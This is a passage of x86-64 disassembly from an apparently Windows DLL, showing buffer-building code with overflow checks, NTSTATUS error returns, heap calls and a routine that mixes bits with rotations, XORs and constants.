   1800041e9:	48 8b 85 48 02 00 00 	mov    0x248(%rbp),%rax
   1800041f0:	49 89 01             	mov    %rax,(%r9)
   1800041f3:	ff 44 24 60          	incl   0x60(%rsp)
   1800041f7:	45 85 f6             	test   %r14d,%r14d
   1800041fa:	0f 88 ba 22 00 00    	js     0x1800064ba
   180004200:	4c 8d 85 08 01 00 00 	lea    0x108(%rbp),%r8
   180004207:	ba ff ff ff 7f       	mov    $0x7fffffff,%edx
   18000420c:	48 8d 0d 9d 72 03 00 	lea    0x3729d(%rip),%rcx        # 0x18003b4b0
   180004213:	e8 dc 32 03 00       	call   0x1800374f4
   180004218:	45 33 db             	xor    %r11d,%r11d
   18000421b:	85 c0                	test   %eax,%eax
   18000421d:	79 16                	jns    0x180004235
   18000421f:	4c 89 9d 08 01 00 00 	mov    %r11,0x108(%rbp)
   180004226:	e9 db fb ff ff       	jmp    0x180003e06
   18000422b:	45 8b f5             	mov    %r13d,%r14d
   18000422e:	44 89 6c 24 30       	mov    %r13d,0x30(%rsp)
   180004233:	eb c2                	jmp    0x1800041f7
   180004235:	48 8b 85 08 01 00 00 	mov    0x108(%rbp),%rax
   18000423c:	48 8d 48 01          	lea    0x1(%rax),%rcx
   180004240:	48 3b c8             	cmp    %rax,%rcx
   180004243:	0f 82 35 25 00 00    	jb     0x18000677e
   180004249:	44 8d 0c 09          	lea    (%rcx,%rcx,1),%r9d
   18000424d:	48 89 8d 08 01 00 00 	mov    %rcx,0x108(%rbp)
   180004254:	45 85 c9             	test   %r9d,%r9d
   180004257:	0f 84 fa 00 00 00    	je     0x180004357
   18000425d:	4c 39 5c 24 68       	cmp    %r11,0x68(%rsp)
   180004262:	75 61                	jne    0x1800042c5
   180004264:	44 03 ce             	add    %esi,%r9d
   180004267:	44 3b ce             	cmp    %esi,%r9d
   18000426a:	72 46                	jb     0x1800042b2
   18000426c:	44 89 8d 3c 01 00 00 	mov    %r9d,0x13c(%rbp)
   180004273:	8b 44 24 64          	mov    0x64(%rsp),%eax
   180004277:	41 bd 95 00 00 c0    	mov    $0xc0000095,%r13d
   18000427d:	46 8d 04 08          	lea    (%rax,%r9,1),%r8d
   180004281:	44 3b c0             	cmp    %eax,%r8d
   180004284:	72 16                	jb     0x18000429c
   180004286:	ff 44 24 60          	incl   0x60(%rsp)
   18000428a:	45 8b f3             	mov    %r11d,%r14d
   18000428d:	44 89 44 24 64       	mov    %r8d,0x64(%rsp)
   180004292:	44 89 5c 24 30       	mov    %r11d,0x30(%rsp)
   180004297:	e9 d1 00 00 00       	jmp    0x18000436d
   18000429c:	41 83 c8 ff          	or     $0xffffffff,%r8d
   1800042a0:	44 89 6c 24 30       	mov    %r13d,0x30(%rsp)
   1800042a5:	44 89 44 24 64       	mov    %r8d,0x64(%rsp)
   1800042aa:	45 8b f5             	mov    %r13d,%r14d
   1800042ad:	e9 bb 00 00 00       	jmp    0x18000436d
   1800042b2:	41 bd 95 00 00 c0    	mov    $0xc0000095,%r13d
   1800042b8:	45 8b f5             	mov    %r13d,%r14d
   1800042bb:	44 89 6c 24 30       	mov    %r13d,0x30(%rsp)
   1800042c0:	e9 a3 00 00 00       	jmp    0x180004368
   1800042c5:	41 8b cb             	mov    %r11d,%ecx
   1800042c8:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   1800042cd:	44 39 5c 24 60       	cmp    %r11d,0x60(%rsp)
   1800042d2:	76 24                	jbe    0x1800042f8
   1800042d4:	8b 02                	mov    (%rdx),%eax
   1800042d6:	03 c6                	add    %esi,%eax
   1800042d8:	3b c6                	cmp    %esi,%eax
   1800042da:	72 d6                	jb     0x1800042b2
   1800042dc:	89 85 3c 01 00 00    	mov    %eax,0x13c(%rbp)
   1800042e2:	44 8b c0             	mov    %eax,%r8d
   1800042e5:	4c 03 c2             	add    %rdx,%r8
   1800042e8:	4c 3b c2             	cmp    %rdx,%r8
   1800042eb:	72 c5                	jb     0x1800042b2
   1800042ed:	ff c1                	inc    %ecx
   1800042ef:	49 8b d0             	mov    %r8,%rdx
   1800042f2:	3b 4c 24 60          	cmp    0x60(%rsp),%ecx
   1800042f6:	72 dc                	jb     0x1800042d4
   1800042f8:	4c 8d 52 04          	lea    0x4(%rdx),%r10
   1800042fc:	4c 3b d2             	cmp    %rdx,%r10
   1800042ff:	72 b1                	jb     0x1800042b2
   180004301:	44 8b 44 24 64       	mov    0x64(%rsp),%r8d
   180004306:	49 8d 41 04          	lea    0x4(%r9),%rax
   18000430a:	41 8b c8             	mov    %r8d,%ecx
   18000430d:	44 89 5c 24 30       	mov    %r11d,0x30(%rsp)
   180004312:	48 03 4c 24 68       	add    0x68(%rsp),%rcx
   180004317:	48 03 c2             	add    %rdx,%rax
   18000431a:	45 8b f3             	mov    %r11d,%r14d
   18000431d:	45 8b d9             	mov    %r9d,%r11d
   180004320:	48 3b c1             	cmp    %rcx,%rax
   180004323:	76 14                	jbe    0x180004339
   180004325:	41 be 23 00 00 c0    	mov    $0xc0000023,%r14d
   18000432b:	45 33 db             	xor    %r11d,%r11d
   18000432e:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   180004333:	45 8d 6e 72          	lea    0x72(%r14),%r13d
   180004337:	eb 34                	jmp    0x18000436d
   180004339:	44 89 0a             	mov    %r9d,(%rdx)
   18000433c:	4d 8b c3             	mov    %r11,%r8
   18000433f:	48 8d 15 6a 71 03 00 	lea    0x3716a(%rip),%rdx        # 0x18003b4b0
   180004346:	49 8b ca             	mov    %r10,%rcx
   180004349:	e8 a4 52 03 00       	call   0x1800395f2
   18000434e:	ff 44 24 60          	incl   0x60(%rsp)
   180004352:	45 33 db             	xor    %r11d,%r11d
   180004355:	eb 0b                	jmp    0x180004362
   180004357:	41 be 0d 00 00 c0    	mov    $0xc000000d,%r14d
   18000435d:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   180004362:	41 bd 95 00 00 c0    	mov    $0xc0000095,%r13d
   180004368:	44 8b 44 24 64       	mov    0x64(%rsp),%r8d
   18000436d:	45 85 f6             	test   %r14d,%r14d
   180004370:	0f 88 44 21 00 00    	js     0x1800064ba
   180004376:	8b 45 5c             	mov    0x5c(%rbp),%eax
   180004379:	89 85 48 01 00 00    	mov    %eax,0x148(%rbp)
   18000437f:	4c 39 5c 24 68       	cmp    %r11,0x68(%rsp)
   180004384:	75 26                	jne    0x1800043ac
   180004386:	44 89 a5 40 01 00 00 	mov    %r12d,0x140(%rbp)
   18000438d:	41 8d 40 08          	lea    0x8(%r8),%eax
   180004391:	41 3b c0             	cmp    %r8d,%eax
   180004394:	0f 82 d7 23 00 00    	jb     0x180006771
   18000439a:	ff 44 24 60          	incl   0x60(%rsp)
   18000439e:	44 8b c0             	mov    %eax,%r8d
   1800043a1:	89 b5 c0 00 00 00    	mov    %esi,0xc0(%rbp)
   1800043a7:	e9 8f 00 00 00       	jmp    0x18000443b
   1800043ac:	41 8b cb             	mov    %r11d,%ecx
   1800043af:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   1800043b4:	44 39 5c 24 60       	cmp    %r11d,0x60(%rsp)
   1800043b9:	76 2c                	jbe    0x1800043e7
   1800043bb:	8b 02                	mov    (%rdx),%eax
   1800043bd:	03 c6                	add    %esi,%eax
   1800043bf:	3b c6                	cmp    %esi,%eax
   1800043c1:	0f 82 98 00 00 00    	jb     0x18000445f
   1800043c7:	89 85 40 01 00 00    	mov    %eax,0x140(%rbp)
   1800043cd:	44 8b c8             	mov    %eax,%r9d
   1800043d0:	4c 03 ca             	add    %rdx,%r9
   1800043d3:	4c 3b ca             	cmp    %rdx,%r9
   1800043d6:	0f 82 95 23 00 00    	jb     0x180006771
   1800043dc:	ff c1                	inc    %ecx
   1800043de:	49 8b d1             	mov    %r9,%rdx
   1800043e1:	3b 4c 24 60          	cmp    0x60(%rsp),%ecx
   1800043e5:	72 d4                	jb     0x1800043bb
   1800043e7:	4c 8d 4a 04          	lea    0x4(%rdx),%r9
   1800043eb:	4c 3b ca             	cmp    %rdx,%r9
   1800043ee:	0f 82 7d 23 00 00    	jb     0x180006771
   1800043f4:	41 8b c8             	mov    %r8d,%ecx
   1800043f7:	48 8d 42 08          	lea    0x8(%rdx),%rax
   1800043fb:	48 03 4c 24 68       	add    0x68(%rsp),%rcx
   180004400:	45 8b f3             	mov    %r11d,%r14d
   180004403:	44 89 5c 24 30       	mov    %r11d,0x30(%rsp)
   180004408:	48 3b c1             	cmp    %rcx,%rax
   18000440b:	0f 87 21 fb ff ff    	ja     0x180003f32
   180004411:	89 32                	mov    %esi,(%rdx)
   180004413:	8b 85 48 01 00 00    	mov    0x148(%rbp),%eax
   180004419:	41 89 01             	mov    %eax,(%r9)
   18000441c:	ff 44 24 60          	incl   0x60(%rsp)
   180004420:	44 8b 44 24 64       	mov    0x64(%rsp),%r8d
   180004425:	45 85 f6             	test   %r14d,%r14d
   180004428:	0f 88 8c 20 00 00    	js     0x1800064ba
   18000442e:	89 b5 c0 00 00 00    	mov    %esi,0xc0(%rbp)
   180004434:	4c 39 5c 24 68       	cmp    %r11,0x68(%rsp)
   180004439:	75 2e                	jne    0x180004469
   18000443b:	44 89 a5 50 01 00 00 	mov    %r12d,0x150(%rbp)
   180004442:	41 8d 40 08          	lea    0x8(%r8),%eax
   180004446:	41 3b c0             	cmp    %r8d,%eax
   180004449:	0f 82 22 23 00 00    	jb     0x180006771
   18000444f:	ff 44 24 60          	incl   0x60(%rsp)
   180004453:	44 8b c0             	mov    %eax,%r8d
   180004456:	89 44 24 64          	mov    %eax,0x64(%rsp)
   18000445a:	e9 8c 00 00 00       	jmp    0x1800044eb
   18000445f:	45 8b f5             	mov    %r13d,%r14d
   180004462:	44 89 6c 24 30       	mov    %r13d,0x30(%rsp)
   180004467:	eb bc                	jmp    0x180004425
   180004469:	41 8b cb             	mov    %r11d,%ecx
   18000446c:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   180004471:	44 39 5c 24 60       	cmp    %r11d,0x60(%rsp)
   180004476:	76 2c                	jbe    0x1800044a4
   180004478:	8b 02                	mov    (%rdx),%eax
   18000447a:	03 c6                	add    %esi,%eax
   18000447c:	3b c6                	cmp    %esi,%eax
   18000447e:	0f 82 eb 00 00 00    	jb     0x18000456f
   180004484:	89 85 50 01 00 00    	mov    %eax,0x150(%rbp)
   18000448a:	44 8b c8             	mov    %eax,%r9d
   18000448d:	4c 03 ca             	add    %rdx,%r9
   180004490:	4c 3b ca             	cmp    %rdx,%r9
   180004493:	0f 82 d8 22 00 00    	jb     0x180006771
   180004499:	ff c1                	inc    %ecx
   18000449b:	49 8b d1             	mov    %r9,%rdx
   18000449e:	3b 4c 24 60          	cmp    0x60(%rsp),%ecx
   1800044a2:	72 d4                	jb     0x180004478
   1800044a4:	4c 8d 4a 04          	lea    0x4(%rdx),%r9
   1800044a8:	4c 3b ca             	cmp    %rdx,%r9
   1800044ab:	0f 82 c0 22 00 00    	jb     0x180006771
   1800044b1:	41 8b c8             	mov    %r8d,%ecx
   1800044b4:	48 8d 42 08          	lea    0x8(%rdx),%rax
   1800044b8:	48 03 4c 24 68       	add    0x68(%rsp),%rcx
   1800044bd:	45 8b f3             	mov    %r11d,%r14d
   1800044c0:	44 89 5c 24 30       	mov    %r11d,0x30(%rsp)
   1800044c5:	48 3b c1             	cmp    %rcx,%rax
   1800044c8:	0f 87 64 fa ff ff    	ja     0x180003f32
   1800044ce:	89 32                	mov    %esi,(%rdx)
   1800044d0:	8b 85 c0 00 00 00    	mov    0xc0(%rbp),%eax
   1800044d6:	41 89 01             	mov    %eax,(%r9)
   1800044d9:	ff 44 24 60          	incl   0x60(%rsp)
   1800044dd:	44 8b 44 24 64       	mov    0x64(%rsp),%r8d
   1800044e2:	45 85 f6             	test   %r14d,%r14d
   1800044e5:	0f 88 cf 1f 00 00    	js     0x1800064ba
   1800044eb:	44 89 a5 60 02 00 00 	mov    %r12d,0x260(%rbp)
   1800044f2:	4d 8b d3             	mov    %r11,%r10
   1800044f5:	4c 89 9d c8 05 00 00 	mov    %r11,0x5c8(%rbp)
   1800044fc:	45 8b cb             	mov    %r11d,%r9d
   1800044ff:	44 89 5c 24 48       	mov    %r11d,0x48(%rsp)
   180004504:	4c 89 9d 00 01 00 00 	mov    %r11,0x100(%rbp)
   18000450b:	4c 89 5d 98          	mov    %r11,-0x68(%rbp)
   18000450f:	44 89 5c 24 4c       	mov    %r11d,0x4c(%rsp)
   180004514:	4c 89 5d 88          	mov    %r11,-0x78(%rbp)
   180004518:	44 89 5d ec          	mov    %r11d,-0x14(%rbp)
   18000451c:	4c 89 9d b8 05 00 00 	mov    %r11,0x5b8(%rbp)
   180004523:	4c 89 9d e0 05 00 00 	mov    %r11,0x5e0(%rbp)
   18000452a:	44 89 5d 48          	mov    %r11d,0x48(%rbp)
   18000452e:	0f 31                	rdtsc
   180004530:	48 c1 e2 20          	shl    $0x20,%rdx
   180004534:	48 0b c2             	or     %rdx,%rax
   180004537:	48 89 85 30 03 00 00 	mov    %rax,0x330(%rbp)
   18000453e:	41 8d 40 08          	lea    0x8(%r8),%eax
   180004542:	83 c9 ff             	or     $0xffffffff,%ecx
   180004545:	41 3b c4             	cmp    %r12d,%eax
   180004548:	0f 43 c8             	cmovae %eax,%ecx
   18000454b:	45 1b f6             	sbb    %r14d,%r14d
   18000454e:	45 23 f5             	and    %r13d,%r14d
   180004551:	41 3b c4             	cmp    %r12d,%eax
   180004554:	0f 82 07 01 00 00    	jb     0x180004661
   18000455a:	8b c1                	mov    %ecx,%eax
   18000455c:	48 83 c0 07          	add    $0x7,%rax
   180004560:	83 e0 f8             	and    $0xfffffff8,%eax
   180004563:	3b c1                	cmp    %ecx,%eax
   180004565:	73 15                	jae    0x18000457c
   180004567:	45 8b f5             	mov    %r13d,%r14d
   18000456a:	e9 f2 00 00 00       	jmp    0x180004661
   18000456f:	45 8b f5             	mov    %r13d,%r14d
   180004572:	44 89 6c 24 30       	mov    %r13d,0x30(%rsp)
   180004577:	e9 66 ff ff ff       	jmp    0x1800044e2
   18000457c:	89 85 b8 00 00 00    	mov    %eax,0xb8(%rbp)
   180004582:	8b f0                	mov    %eax,%esi
   180004584:	48 ff 15 25 64 03 00 	rex.W call *0x36425(%rip)        # 0x18003a9b0
   18000458b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004590:	44 8b c6             	mov    %esi,%r8d
   180004593:	41 8b d4             	mov    %r12d,%edx
   180004596:	48 8b c8             	mov    %rax,%rcx
   180004599:	48 ff 15 08 64 03 00 	rex.W call *0x36408(%rip)        # 0x18003a9a8
   1800045a0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800045a5:	45 33 db             	xor    %r11d,%r11d
   1800045a8:	48 8b f0             	mov    %rax,%rsi
   1800045ab:	48 85 c0             	test   %rax,%rax
   1800045ae:	75 0b                	jne    0x1800045bb
   1800045b0:	41 be 17 00 00 c0    	mov    $0xc0000017,%r14d
   1800045b6:	e9 9a 00 00 00       	jmp    0x180004655
   1800045bb:	8b 44 24 60          	mov    0x60(%rsp),%eax
   1800045bf:	48 8d 4e 04          	lea    0x4(%rsi),%rcx
   1800045c3:	89 06                	mov    %eax,(%rsi)
   1800045c5:	48 3b ce             	cmp    %rsi,%rcx
   1800045c8:	72 54                	jb     0x18000461e
   1800045ca:	8b 44 24 64          	mov    0x64(%rsp),%eax
   1800045ce:	4c 8d 49 04          	lea    0x4(%rcx),%r9
   1800045d2:	89 01                	mov    %eax,(%rcx)
   1800045d4:	4c 3b c9             	cmp    %rcx,%r9
   1800045d7:	72 45                	jb     0x18000461e
   1800045d9:	8b 8d b8 00 00 00    	mov    0xb8(%rbp),%ecx
   1800045df:	45 8b f3             	mov    %r11d,%r14d
   1800045e2:	48 8b 85 30 03 00 00 	mov    0x330(%rbp),%rax
   1800045e9:	48 89 44 31 f8       	mov    %rax,-0x8(%rcx,%rsi,1)
   1800045ee:	49 8b c9             	mov    %r9,%rcx
   1800045f1:	44 8b 44 24 64       	mov    0x64(%rsp),%r8d
   1800045f6:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   1800045fb:	e8 f2 4f 03 00       	call   0x1800395f2
   180004600:	44 8b 8d b8 00 00 00 	mov    0xb8(%rbp),%r9d
   180004607:	45 33 db             	xor    %r11d,%r11d
   18000460a:	4c 8b d6             	mov    %rsi,%r10
   18000460d:	48 89 b5 c8 05 00 00 	mov    %rsi,0x5c8(%rbp)
   180004614:	41 8b f3             	mov    %r11d,%esi
   180004617:	44 89 4c 24 48       	mov    %r9d,0x48(%rsp)
   18000461c:	eb 0f                	jmp    0x18000462d
   18000461e:	4c 8b 95 c8 05 00 00 	mov    0x5c8(%rbp),%r10
   180004625:	45 8b f5             	mov    %r13d,%r14d
   180004628:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
   18000462d:	48 85 f6             	test   %rsi,%rsi
   180004630:	74 2f                	je     0x180004661
   180004632:	48 ff 15 77 63 03 00 	rex.W call *0x36377(%rip)        # 0x18003a9b0
   180004639:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000463e:	4c 8b c6             	mov    %rsi,%r8
   180004641:	33 d2                	xor    %edx,%edx
   180004643:	48 8b c8             	mov    %rax,%rcx
   180004646:	48 ff 15 53 63 03 00 	rex.W call *0x36353(%rip)        # 0x18003a9a0
   18000464d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180004652:	45 33 db             	xor    %r11d,%r11d
   180004655:	4c 8b 95 c8 05 00 00 	mov    0x5c8(%rbp),%r10
   18000465c:	44 8b 4c 24 48       	mov    0x48(%rsp),%r9d
   180004661:	41 81 ce 00 00 00 10 	or     $0x10000000,%r14d
   180004668:	44 89 74 24 30       	mov    %r14d,0x30(%rsp)
   18000466d:	0f 8c 66 0b 00 00    	jl     0x1800051d9
   180004673:	4c 89 9d d8 01 00 00 	mov    %r11,0x1d8(%rbp)
   18000467a:	4d 8b eb             	mov    %r11,%r13
   18000467d:	4c 89 5d e0          	mov    %r11,-0x20(%rbp)
   180004681:	4d 85 d2             	test   %r10,%r10
   180004684:	75 0b                	jne    0x180004691
   180004686:	41 be 0d 00 00 c0    	mov    $0xc000000d,%r14d
   18000468c:	e9 8f 08 00 00       	jmp    0x180004f20
   180004691:	41 8b f1             	mov    %r9d,%esi
   180004694:	48 89 75 a0          	mov    %rsi,-0x60(%rbp)
   180004698:	45 85 c9             	test   %r9d,%r9d
   18000469b:	0f 84 88 07 00 00    	je     0x180004e29
   1800046a1:	4c 8d 76 08          	lea    0x8(%rsi),%r14
   1800046a5:	4c 89 75 90          	mov    %r14,-0x70(%rbp)
   1800046a9:	48 ff 15 00 63 03 00 	rex.W call *0x36300(%rip)        # 0x18003a9b0
   1800046b0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800046b5:	4d 8b c6             	mov    %r14,%r8
   1800046b8:	33 d2                	xor    %edx,%edx
   1800046ba:	48 8b c8             	mov    %rax,%rcx
   1800046bd:	48 ff 15 e4 62 03 00 	rex.W call *0x362e4(%rip)        # 0x18003a9a8
   1800046c4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800046c9:	45 33 db             	xor    %r11d,%r11d
   1800046cc:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   1800046d0:	48 85 c0             	test   %rax,%rax
   1800046d3:	0f 84 50 07 00 00    	je     0x180004e29
   1800046d9:	4c 8b 8d c8 05 00 00 	mov    0x5c8(%rbp),%r9
   1800046e0:	41 8a d3             	mov    %r11b,%dl
   1800046e3:	88 54 24 34          	mov    %dl,0x34(%rsp)
   1800046e7:	41 8b cb             	mov    %r11d,%ecx
   1800046ea:	48 85 f6             	test   %rsi,%rsi
   1800046ed:	74 10                	je     0x1800046ff
   1800046ef:	42 32 14 09          	xor    (%rcx,%r9,1),%dl
   1800046f3:	48 ff c1             	inc    %rcx
   1800046f6:	48 3b ce             	cmp    %rsi,%rcx
   1800046f9:	72 f4                	jb     0x1800046ef
   1800046fb:	88 54 24 34          	mov    %dl,0x34(%rsp)
   1800046ff:	45 33 c0             	xor    %r8d,%r8d
   180004702:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   180004706:	48 8b c8             	mov    %rax,%rcx
   180004709:	48 89 9d d8 05 00 00 	mov    %rbx,0x5d8(%rbp)
   180004710:	45 8b d3             	mov    %r11d,%r10d
   180004713:	44 89 44 24 38       	mov    %r8d,0x38(%rsp)
   180004718:	41 83 cb ff          	or     $0xffffffff,%r11d
   18000471c:	44 89 44 24 48       	mov    %r8d,0x48(%rsp)
   180004721:	48 8b c6             	mov    %rsi,%rax
   180004724:	83 e0 07             	and    $0x7,%eax
   180004727:	0f 84 00 01 00 00    	je     0x18000482d
   18000472d:	44 89 44 24 38       	mov    %r8d,0x38(%rsp)
   180004732:	41 8b c8             	mov    %r8d,%ecx
   180004735:	89 4c 24 48          	mov    %ecx,0x48(%rsp)
   180004739:	45 8b f0             	mov    %r8d,%r14d
   18000473c:	45 8b d8             	mov    %r8d,%r11d
   18000473f:	85 c0                	test   %eax,%eax
   180004741:	74 42                	je     0x180004785
   180004743:	45 8d 50 38          	lea    0x38(%r8),%r10d
   180004747:	45 0f b6 01          	movzbl (%r9),%r8d
   18000474b:	49 ff c1             	inc    %r9
   18000474e:	41 83 fb 04          	cmp    $0x4,%r11d
   180004752:	7d 14                	jge    0x180004768
   180004754:	41 8d 4a e0          	lea    -0x20(%r10),%ecx
   180004758:	41 d3 e0             	shl    %cl,%r8d
   18000475b:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   18000475f:	41 0b c8             	or     %r8d,%ecx
   180004762:	89 4c 24 48          	mov    %ecx,0x48(%rsp)
   180004766:	eb 0d                	jmp    0x180004775
   180004768:	41 8b ca             	mov    %r10d,%ecx
   18000476b:	41 d3 e0             	shl    %cl,%r8d
   18000476e:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   180004772:	45 0b f0             	or     %r8d,%r14d
   180004775:	41 ff c3             	inc    %r11d
   180004778:	45 2b d4             	sub    %r12d,%r10d
   18000477b:	44 3b d8             	cmp    %eax,%r11d
   18000477e:	7c c7                	jl     0x180004747
   180004780:	44 89 74 24 38       	mov    %r14d,0x38(%rsp)
   180004785:	44 8b d1             	mov    %ecx,%r10d
   180004788:	45 8b de             	mov    %r14d,%r11d
   18000478b:	41 81 f2 7a 30 7a b1 	xor    $0xb17a307a,%r10d
   180004792:	41 81 f3 8d b1 f6 42 	xor    $0x42f6b18d,%r11d
   180004799:	45 33 f6             	xor    %r14d,%r14d
   18000479c:	41 8b ca             	mov    %r10d,%ecx
   18000479f:	45 8b c3             	mov    %r11d,%r8d
   1800047a2:	85 c0                	test   %eax,%eax
   1800047a4:	74 50                	je     0x1800047f6
   1800047a6:	48 8b 7d a8          	mov    -0x58(%rbp),%rdi
   1800047aa:	48 8d 5f 01          	lea    0x1(%rdi),%rbx
   1800047ae:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   1800047b3:	41 83 fe 04          	cmp    $0x4,%r14d
   1800047b7:	7d 07                	jge    0x1800047c0
   1800047b9:	c1 c1 08             	rol    $0x8,%ecx
   1800047bc:	8b d9                	mov    %ecx,%ebx
   1800047be:	eb 07                	jmp    0x1800047c7
   1800047c0:	41 c1 c0 08          	rol    $0x8,%r8d
   1800047c4:	41 8b d8             	mov    %r8d,%ebx
   1800047c7:	88 1f                	mov    %bl,(%rdi)
   1800047c9:	41 ff c6             	inc    %r14d
   1800047cc:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1800047d1:	48 8b fb             	mov    %rbx,%rdi
   1800047d4:	44 3b f0             	cmp    %eax,%r14d
   1800047d7:	7c d1                	jl     0x1800047aa
   1800047d9:	48 8b cb             	mov    %rbx,%rcx
   1800047dc:	48 89 5d a8          	mov    %rbx,-0x58(%rbp)
   1800047e0:	48 bb 58 4a b5 b1 17 	movabs $0xc81ecb17b1b54a58,%rbx
   1800047e7:	cb 1e c8 
   1800047ea:	48 bf 5e 60 69 ab 7f 	movabs $0x7f1137fab69605e,%rdi
   1800047f1:	13 f1 07 
   1800047f4:	eb 04                	jmp    0x1800047fa
   1800047f6:	48 8b 4d a8          	mov    -0x58(%rbp),%rcx
   1800047fa:	83 f8 04             	cmp    $0x4,%eax
   1800047fd:	76 10                	jbe    0x18000480f
   1800047ff:	41 8b cc             	mov    %r12d,%ecx
   180004802:	2b c8                	sub    %eax,%ecx
   180004804:	c1 e1 03             	shl    $0x3,%ecx
   180004807:	41 d3 eb             	shr    %cl,%r11d
   18000480a:	41 d3 e3             	shl    %cl,%r11d
   18000480d:	eb 1a                	jmp    0x180004829
   18000480f:	45 33 c0             	xor    %r8d,%r8d
   180004812:	45 8b d8             	mov    %r8d,%r11d
   180004815:	83 f8 04             	cmp    $0x4,%eax
   180004818:	73 13                	jae    0x18000482d
   18000481a:	41 8d 48 04          	lea    0x4(%r8),%ecx
   18000481e:	2b c8                	sub    %eax,%ecx
   180004820:	c1 e1 03             	shl    $0x3,%ecx
   180004823:	41 d3 ea             	shr    %cl,%r10d
   180004826:	41 d3 e2             	shl    %cl,%r10d
   180004829:	48 8b 4d a8          	mov    -0x58(%rbp),%rcx
   18000482d:	4c 8b f6             	mov    %rsi,%r14
   180004830:	49 c1 ee 03          	shr    $0x3,%r14
   180004834:	4d 85 f6             	test   %r14,%r14
   180004837:	0f 84 52 03 00 00    	je     0x180004b8f
   18000483d:	0f b7 85 de 05 00 00 	movzwl 0x5de(%rbp),%eax
   180004844:	48 8d 51 07          	lea    0x7(%rcx),%rdx
   180004848:	8b 7c 24 38          	mov    0x38(%rsp),%edi
   18000484c:	49 8d 49 02          	lea    0x2(%r9),%rcx
   180004850:	44 8b 7c 24 48       	mov    0x48(%rsp),%r15d
   180004855:	0f b7 b5 dc 05 00 00 	movzwl 0x5dc(%rbp),%esi
   18000485c:	89 45 80             	mov    %eax,-0x80(%rbp)
   18000485f:	0f b7 c3             	movzwl %bx,%eax
   180004862:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180004866:	0f b7 85 da 05 00 00 	movzwl 0x5da(%rbp),%eax
   18000486d:	44 8b 6c 24 30       	mov    0x30(%rsp),%r13d
   180004872:	89 44 24 58          	mov    %eax,0x58(%rsp)
   180004876:	0f b6 41 ff          	movzbl -0x1(%rcx),%eax
   18000487a:	44 0f b6 49 fe       	movzbl -0x2(%rcx),%r9d
   18000487f:	44 0f b6 41 02       	movzbl 0x2(%rcx),%r8d
   180004884:	41 c1 e1 08          	shl    $0x8,%r9d
   180004888:	44 0b c8             	or     %eax,%r9d
   18000488b:	41 c1 e0 08          	shl    $0x8,%r8d
   18000488f:	0f b6 01             	movzbl (%rcx),%eax
   180004892:	41 c1 e1 08          	shl    $0x8,%r9d
   180004896:	44 0b c8             	or     %eax,%r9d
   180004899:	0f b6 41 01          	movzbl 0x1(%rcx),%eax
   18000489d:	41 c1 e1 08          	shl    $0x8,%r9d
   1800048a1:	44 0b c8             	or     %eax,%r9d
   1800048a4:	0f b6 41 03          	movzbl 0x3(%rcx),%eax
   1800048a8:	44 0b c0             	or     %eax,%r8d
   1800048ab:	0f b6 41 04          	movzbl 0x4(%rcx),%eax
   1800048af:	41 c1 e0 08          	shl    $0x8,%r8d
   1800048b3:	44 0b c0             	or     %eax,%r8d
   1800048b6:	0f b6 41 05          	movzbl 0x5(%rcx),%eax
   1800048ba:	49 03 cc             	add    %r12,%rcx
   1800048bd:	41 c1 e0 08          	shl    $0x8,%r8d
   1800048c1:	44 0b c0             	or     %eax,%r8d
   1800048c4:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   1800048c9:	8b 8d dc 05 00 00    	mov    0x5dc(%rbp),%ecx
   1800048cf:	45 33 d8             	xor    %r8d,%r11d
   1800048d2:	41 8b c3             	mov    %r11d,%eax
   1800048d5:	41 2b c5             	sub    %r13d,%eax
   1800048d8:	33 85 dc 05 00 00    	xor    0x5dc(%rbp),%eax
   1800048de:	41 33 c1             	xor    %r9d,%eax
   1800048e1:	44 33 d0             	xor    %eax,%r10d
   1800048e4:	0f b7 85 da 05 00 00 	movzwl 0x5da(%rbp),%eax
   1800048eb:	41 33 ca             	xor    %r10d,%ecx
   1800048ee:	c1 c9 0f             	ror    $0xf,%ecx
   1800048f1:	0f af c8             	imul   %eax,%ecx
   1800048f4:	41 8b c2             	mov    %r10d,%eax
   1800048f7:	c1 c8 07             	ror    $0x7,%eax
   1800048fa:	03 c8                	add    %eax,%ecx
   1800048fc:	44 33 d9             	xor    %ecx,%r11d
   1800048ff:	41 8b c3             	mov    %r11d,%eax
   180004902:	c1 c8 0a             	ror    $0xa,%eax
   180004905:	41 8d 0c 1b          	lea    (%r11,%rbx,1),%ecx
   180004909:	c1 c9 09             	ror    $0x9,%ecx
   18000490c:	0f af ce             	imul   %esi,%ecx
   18000490f:	2b c8                	sub    %eax,%ecx
   180004911:	0f b7 85 de 05 00 00 	movzwl 0x5de(%rbp),%eax
   180004918:	44 33 d1             	xor    %ecx,%r10d
   18000491b:	41 8b ca             	mov    %r10d,%ecx
   18000491e:	33 ce                	xor    %esi,%ecx
   180004920:	c1 c1 04             	rol    $0x4,%ecx
   180004923:	0f af c8             	imul   %eax,%ecx
   180004926:	41 8b c2             	mov    %r10d,%eax
   180004929:	c1 c0 05             	rol    $0x5,%eax
   18000492c:	03 c8                	add    %eax,%ecx
   18000492e:	8b 85 dc 05 00 00    	mov    0x5dc(%rbp),%eax
   180004934:	44 33 d9             	xor    %ecx,%r11d
   180004937:	41 8b cb             	mov    %r11d,%ecx
   18000493a:	33 cb                	xor    %ebx,%ecx
   18000493c:	2b c1                	sub    %ecx,%eax
